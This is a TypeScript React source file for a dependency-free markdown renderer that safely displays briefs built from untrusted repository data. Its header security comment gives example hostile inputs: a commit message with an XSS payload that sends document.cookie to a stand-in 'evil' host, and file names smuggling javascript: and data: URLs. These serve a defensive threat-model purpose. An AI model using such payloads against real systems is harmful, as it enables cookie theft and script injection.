import { useMemo, type ReactNode } from 'react'

/**
 * A deliberately small markdown renderer. No dependency, no HTML.
 *
 * Supported: h1–h4, paragraphs, unordered and ordered lists, fenced code
 * blocks, inline code, bold, italic, links, blockquotes, horizontal rules.
 * Everything else is rendered as the literal text it is.
 *
 * ---------------------------------------------------------------------------
 * SECURITY — read this before changing anything in this file.
 * ---------------------------------------------------------------------------
 * The source string handed to this component is assembled from an UNTRUSTED
 * repository. File paths, commit subjects, branch names and author names are
 * copied into the brief verbatim, which means a repository author chooses the
 * exact bytes that reach this parser. Treat every input as hostile:
 *
 *   `git commit -m '<img src=x onerror=fetch("http://evil/"+document.cookie)>'`
 *   `touch 'src/[click](javascript:doSomethingBad()).ts'`
 *   `touch 'docs/](data:text/html;base64,PHNjcmlwdD4=)#.md'`
 *
 * Two invariants make all of that inert. Both must survive every future edit:
 *
 *   1. NO HTML IS EVER CONSTRUCTED. There is no `dangerouslySetInnerHTML` in
 *      this file and no code path builds an HTML string. Tokens become React
 *      elements and React escapes text children, so raw HTML in the source
 *      renders as visible literal text — the correct outcome for a document
 *      that is meant to be read, not executed.
 *
 *   2. NO NON-http(s) URL EVER REACHES A NAVIGATION. `safeHref` parses with the
 *      URL constructor and admits only `http:` and `https:`. `javascript:`,
 *      `data:`, `file:`, `vbscript:`, protocol-relative and relative URLs all
 *      return null, and a null href renders the link as PLAIN TEXT. Admitted
 *      links are opened through `window.vde.app.openExternal` — never an
 *      `<a href>` — so an in-app navigation or window.open is impossible even
 *      if a bad URL somehow slipped through the check.
 *
 * Cases the parser is expected to get right (unit-style notes):
 *   parseInline('a `<b>` c')            → text, code('<b>'), text   (never markup)
 *   parseInline('[x](javascript:1)')    → link with href null       → plain text
 *   parseInline('[x](HTTPS://a.example)') → link, href 'https://a.example/'
 *   parseInline('src/my_file_name.ts')  → one text run, NOT emphasis
 *                                         (intra-word `_` cannot open emphasis,
 *                                          which matters because paths are the
 *                                          most common content in a brief)
 *   parseBlocks('```\n**x**\n```')      → code block, contents unparsed
 */

// ---------------------------------------------------------------------------
// Token model
// ---------------------------------------------------------------------------

type Inline =
  | { kind: 'text'; value: string }
  | { kind: 'code'; value: string }
  | { kind: 'strong'; children: Inline[] }
  | { kind: 'em'; children: Inline[] }
  /** href is null when the URL was rejected; the label then renders as text. */
  | { kind: 'link'; href: string | null; children: Inline[] }

type Block =
  | { kind: 'heading'; level: 1 | 2 | 3 | 4; children: Inline[] }
  | { kind: 'paragraph'; children: Inline[] }
  | { kind: 'code'; lang: string | null; value: string }
  | { kind: 'list'; ordered: boolean; start: number; items: Inline[][] }
  | { kind: 'quote'; blocks: Block[] }
  | { kind: 'rule' }

// ---------------------------------------------------------------------------
// URL safety
// ---------------------------------------------------------------------------

/**
 * The only place a URL is admitted. Returns a normalised absolute http(s) URL,
 * or null for everything else — including anything the URL constructor refuses
 * to parse, which covers relative paths and malformed input.
 */
function safeHref(raw: string): string | null {
  // `[text](url "title")` — the title is not supported, so drop it.
  const first = raw.trim().split(/\s+/)[0] ?? ''
  const cleaned = first.replace(/^<+/, '').replace(/>+$/, '')
  if (cleaned === '') return null
  let url: URL
  try {
    url = new URL(cleaned)
  } catch {
    return null
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null
  return url.href
}

// ---------------------------------------------------------------------------
// Inline parsing
// ---------------------------------------------------------------------------

function isWordChar(c: string): boolean {
  return c !== '' && /[A-Za-z0-9]/.test(c)
}

/**
 * Finds the closing run for an emphasis marker starting at `from`.
 * `wordAware` applies the `_` rule: an underscore cannot close emphasis when it
 * sits inside a word, so `snake_case_path` stays literal.
 */
function findClose(src: string, from: number, marker: string, wordAware: boolean): number {
  let j = from
  while (j < src.length) {
    if (src.charAt(j) === '\\') {
      j += 2
      continue
    }
    if (src.startsWith(marker, j)) {
      const emptySpan = j === from
      const precededBySpace = /\s/.test(src.charAt(j - 1))
      const insideWord = wordAware && isWordChar(src.charAt(j + marker.length))
      if (emptySpan || precededBySpace || insideWord) {
        j += 1
        continue
      }
      return j
    }
    j += 1
  }
  return -1
}

function parseLink(src: string, start: number): { node: Inline; next: number } | null {
  let depth = 0
  let j = start
  let labelEnd = -1
  while (j < src.length) {
    const c = src.charAt(j)
    if (c === '\\') {
      j += 2
      continue
    }
    if (c === '[') depth += 1
    else if (c === ']') {
      depth -= 1
      if (depth === 0) {
        labelEnd = j
        break
      }
    }
    j += 1
  }
  if (labelEnd === -1 || src.charAt(labelEnd + 1) !== '(') return null

  let k = labelEnd + 2
  let parens = 1
  let hrefEnd = -1
  while (k < src.length) {
    const c = src.charAt(k)
    if (c === '\\') {
      k += 2
      continue
    }
    if (c === '(') parens += 1
    else if (c === ')') {
      parens -= 1
      if (parens === 0) {
        hrefEnd = k
        break
      }
    }
    k += 1
  }
  if (hrefEnd === -1) return null

  const label = src.slice(start + 1, labelEnd)
  const href = safeHref(src.slice(labelEnd + 2, hrefEnd))
  return { node: { kind: 'link', href, children: parseInline(label) }, next: hrefEnd + 1 }
}

function parseInline(src: string): Inline[] {
  const out: Inline[] = []
  let buf = ''
  let i = 0

  const flush = (): void => {
    if (buf.length > 0) {
      out.push({ kind: 'text', value: buf })
      buf = ''
    }
  }

  while (i < src.length) {
    const ch = src.charAt(i)

    // A backslash makes the next character literal.
    if (ch === '\\' && i + 1 < src.length) {
      buf += src.charAt(i + 1)
      i += 2
      continue
    }

    // Inline code: a run of N backticks closes on the next run of N.
    if (ch === '`') {
      let run = 1
      while (src.charAt(i + run) === '`') run += 1
      const fence = '`'.repeat(run)
      const end = src.indexOf(fence, i + run)
      if (end !== -1) {
        flush()
        const raw = src.slice(i + run, end)
        out.push({ kind: 'code', value: raw.length > 2 ? raw.replace(/^ (.*) $/, '$1') : raw })
        i = end + run
        continue
      }
    }

    // Strong: ** or __
    if ((ch === '*' || ch === '_') && src.charAt(i + 1) === ch) {
      const canOpen = ch === '*' || !isWordChar(src.charAt(i - 1))
      if (canOpen) {
        const end = findClose(src, i + 2, ch + ch, ch === '_')
        if (end !== -1) {
          flush()
          out.push({ kind: 'strong', children: parseInline(src.slice(i + 2, end)) })
          i = end + 2
          continue
        }
      }
    }

    // Emphasis: * or _
    if (ch === '*' || ch === '_') {
      const next = src.charAt(i + 1)
      const canOpen =
        (ch === '*' || !isWordChar(src.charAt(i - 1))) && next !== '' && !/\s/.test(next)
      if (canOpen) {
        const end = findClose(src, i + 1, ch, ch === '_')
        if (end !== -1) {
          flush()
          out.push({ kind: 'em', children: parseInline(src.slice(i + 1, end)) })
          i = end + 1
          continue
        }
      }
    }

    if (ch === '[') {
      const link = parseLink(src, i)
      if (link) {
        flush()
        out.push(link.node)
        i = link.next
        continue
      }
    }

    buf += ch
    i += 1
  }

  flush()
  return out
}

// ---------------------------------------------------------------------------
// Block parsing
// ---------------------------------------------------------------------------

const RE_FENCE = /^ {0,3}(`{3,}|~{3,})\s*([A-Za-z0-9_+#.-]*)\s*$/
const RE_HEADING = /^ {0,3}(#{1,6})\s+(.*?)\s*#*\s*$/
const RE_RULE = /^ {0,3}(?:-{3,}|\*{3,}|_{3,})\s*$/
const RE_QUOTE = /^ {0,3}>\s?(.*)$/
const RE_UL = /^ {0,3}[-*+]\s+(.*)$/
const RE_OL = /^ {0,3}(\d{1,9})[.)]\s+(.*)$/
const RE_CONTINUATION = /^\s{2,}\S/

function startsBlock(line: string): boolean {
  return (
    RE_FENCE.test(line) ||
    RE_HEADING.test(line) ||
    RE_RULE.test(line) ||
    RE_QUOTE.test(line) ||
    RE_UL.test(line) ||
    RE_OL.test(line)
  )
}

function parseBlocks(src: string): Block[] {
  const lines = src.replace(/\r\n?/g, '\n').split('\n')
  const blocks: Block[] = []
  let i = 0

  while (i < lines.length) {
    const line = lines[i] ?? ''

    if (line.trim() === '') {
      i += 1
      continue
    }

    // ---- fenced code -----------------------------------------------------
    const fence = RE_FENCE.exec(line)
    if (fence) {
      const marker = fence[1] ?? '```'
      const fenceChar = marker.charAt(0)
      const lang = (fence[2] ?? '').trim()
      const body: string[] = []
      i += 1
      while (i < lines.length) {
        const l = lines[i] ?? ''
        const t = l.trim()
        const closes = t.length >= marker.length && t.split('').every((c) => c === fenceChar)
        i += 1
        if (closes) break
        body.push(l)
      }
      blocks.push({ kind: 'code', lang: lang === '' ? null : lang, value: body.join('\n') })
      continue
    }

    // ---- heading ---------------------------------------------------------
    const heading = RE_HEADING.exec(line)
    if (heading) {
      const depth = Math.min(4, (heading[1] ?? '#').length)
      const level = (depth < 1 ? 1 : depth) as 1 | 2 | 3 | 4
      blocks.push({ kind: 'heading', level, children: parseInline(heading[2] ?? '') })
      i += 1
      continue
    }

    // ---- horizontal rule -------------------------------------------------
    if (RE_RULE.test(line)) {
      blocks.push({ kind: 'rule' })
      i += 1
      continue
    }

    // ---- blockquote ------------------------------------------------------
    if (RE_QUOTE.test(line)) {
      const inner: string[] = []
      while (i < lines.length) {
        const l = lines[i] ?? ''
        const m = RE_QUOTE.exec(l)
        if (m) {
          inner.push(m[1] ?? '')
          i += 1
          continue
        }
        if (l.trim() === '' || startsBlock(l)) break
        inner.push(l) // lazy continuation
        i += 1
      }
      blocks.push({ kind: 'quote', blocks: parseBlocks(inner.join('\n')) })
      continue
    }

    // ---- lists -----------------------------------------------------------
    const ol = RE_OL.exec(line)
    const ul = ol ? null : RE_UL.exec(line)
    if (ol || ul) {
      const ordered = ol !== null
      const startNum = ol ? Number.parseInt(ol[1] ?? '1', 10) : 1
      const items: string[] = []
      while (i < lines.length) {
        const l = lines[i] ?? ''
        if (l.trim() === '') {
          const next = lines[i + 1] ?? ''
          const continues =
            (ordered ? RE_OL.test(next) : RE_UL.test(next)) || RE_CONTINUATION.test(next)
          if (!continues) break
          i += 1
          continue
        }
        const item = ordered ? RE_OL.exec(l) : RE_UL.exec(l)
        if (item) {
          items.push((ordered ? item[2] : item[1]) ?? '')
          i += 1
          continue
        }
        if (RE_CONTINUATION.test(l) && items.length > 0) {
          const last = items.length - 1
          items[last] = `${items[last] ?? ''} ${l.trim()}`
          i += 1
          continue
        }
        break
      }
      blocks.push({
        kind: 'list',
        ordered,
        start: Number.isFinite(startNum) ? startNum : 1,
        items: items.map((t) => parseInline(t))
      })
      continue
    }

    // ---- paragraph -------------------------------------------------------
    const para: string[] = []
    while (i < lines.length) {
      const l = lines[i] ?? ''
      if (l.trim() === '' || startsBlock(l)) break
      para.push(l.trim())
      i += 1
    }
    if (para.length === 0) {
      i += 1 // defensive: the loop must always make progress
      continue
    }
    blocks.push({ kind: 'paragraph', children: parseInline(para.join(' ')) })
  }

  return blocks
}

// ---------------------------------------------------------------------------
// Rendering — React elements only, never markup
// ---------------------------------------------------------------------------

function SafeLink({ href, children }: { href: string; children: ReactNode }): ReactNode {
  return (
    <button
      type="button"
      title={href}
      onClick={() => {
        void window.vde.app.openExternal(href)
      }}
      className="inline underline decoration-1 underline-offset-2"
      style={{ color: 'var(--focus-ring)' }}
    >
      {children}
    </button>
  )
}

function InlineCode({ children }: { children: string }): ReactNode {
  return (
    <code
      className="rounded-[3px] px-1 py-[1px] font-mono text-[0.92em]"
      style={{ background: 'var(--surface-3)', color: 'var(--ink-primary)' }}
    >
      {children}
    </code>
  )
}

function renderInline(nodes: Inline[], prefix: string): ReactNode[] {
  return nodes.map((n, idx) => {
    const key = `${prefix}-${idx}`
    switch (n.kind) {
      case 'text':
        return <span key={key}>{n.value}</span>
      case 'code':
        return <InlineCode key={key}>{n.value}</InlineCode>
      case 'strong':
        return (
          <strong key={key} className="font-semibold" style={{ color: 'var(--ink-primary)' }}>
            {renderInline(n.children, key)}
          </strong>
        )
      case 'em':
        return (
          <em key={key} className="italic">
            {renderInline(n.children, key)}
          </em>
        )
      case 'link': {
        const label = renderInline(n.children, key)
        // Rejected protocols degrade to plain text — never a navigation.
        return n.href === null ? (
          <span key={key}>{label}</span>
        ) : (
          <SafeLink key={key} href={n.href}>
            {label}
          </SafeLink>
        )
      }
      default:
        return null
    }
  })
}

const HEADING_CLASS: Record<1 | 2 | 3 | 4, string> = {
  1: 'mt-5 mb-2 text-[15px] font-semibold tracking-[-0.01em] first:mt-0',
  2: 'mt-5 mb-1.5 text-[13px] font-semibold first:mt-0',
  3: 'mt-4 mb-1 text-[12px] font-semibold first:mt-0',
  4: 'mt-3 mb-1 text-[11px] font-semibold uppercase tracking-[0.06em] first:mt-0'
}

function renderBlock(block: Block, key: string): ReactNode {
  switch (block.kind) {
    case 'heading': {
      const cls = HEADING_CLASS[block.level]
      const body = renderInline(block.children, key)
      const style = { color: 'var(--ink-primary)' }
      if (block.level === 1) {
        return (
          <h1 key={key} className={cls} style={style}>
            {body}
          </h1>
        )
      }
      if (block.level === 2) {
        return (
          <h2 key={key} className={cls} style={style}>
            {body}
          </h2>
        )
      }
      if (block.level === 3) {
        return (
          <h3 key={key} className={cls} style={style}>
            {body}
          </h3>
        )
      }
      return (
        <h4 key={key} className={cls} style={{ color: 'var(--ink-muted)' }}>
          {body}
        </h4>
      )
    }

    case 'paragraph':
      return (
        <p key={key} className="my-2 text-[12.5px] leading-[1.65]" style={{ color: 'var(--ink-secondary)' }}>
          {renderInline(block.children, key)}
        </p>
      )

    case 'code':
      return (
        <div
          key={key}
          className="my-2.5 overflow-hidden rounded-md"
          style={{ background: 'var(--surface-inset)', border: '1px solid var(--hairline)' }}
        >
          {block.lang ? (
            <div
              className="border-b px-2.5 py-1 font-mono text-[10px]"
              style={{ borderColor: 'var(--hairline)', color: 'var(--ink-faint)' }}
            >
              {block.lang}
            </div>
          ) : null}
          <pre className="overflow-x-auto px-2.5 py-2">
            <code
              className="font-mono text-[11.5px] leading-[1.6]"
              style={{ color: 'var(--ink-primary)' }}
            >
              {block.value}
            </code>
          </pre>
        </div>
      )

    case 'list': {
      const items = block.items.map((item, idx) => (
        <li key={`${key}-i${idx}`} className="my-1 pl-1 text-[12.5px] leading-[1.6]">
          {renderInline(item, `${key}-i${idx}`)}
        </li>
      ))
      return block.ordered ? (
        <ol
          key={key}
          start={block.start}
          className="my-2 list-decimal pl-5"
          style={{ color: 'var(--ink-secondary)' }}
        >
          {items}
        </ol>
      ) : (
        <ul key={key} className="my-2 list-disc pl-5" style={{ color: 'var(--ink-secondary)' }}>
          {items}
        </ul>
      )
    }

    case 'quote':
      return (
        <blockquote
          key={key}
          className="my-2.5 pl-3"
          style={{ borderLeft: '2px solid var(--hairline-strong)', color: 'var(--ink-muted)' }}
        >
          {block.blocks.map((b, idx) => renderBlock(b, `${key}-q${idx}`))}
        </blockquote>
      )

    case 'rule':
      return (
        <hr
          key={key}
          className="my-4 border-0"
          style={{ borderTop: '1px solid var(--hairline)' }}
        />
      )

    default:
      return null
  }
}

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------

export interface MarkdownProps {
  /** Untrusted markdown. See the security note at the top of this file. */
  source: string
  className?: string
}

export function Markdown({ source, className }: MarkdownProps): ReactNode {
  const blocks = useMemo(() => parseBlocks(source), [source])
  return (
    <div className={className} data-selectable>
      {blocks.map((b, i) => renderBlock(b, `b${i}`))}
    </div>
  )
}
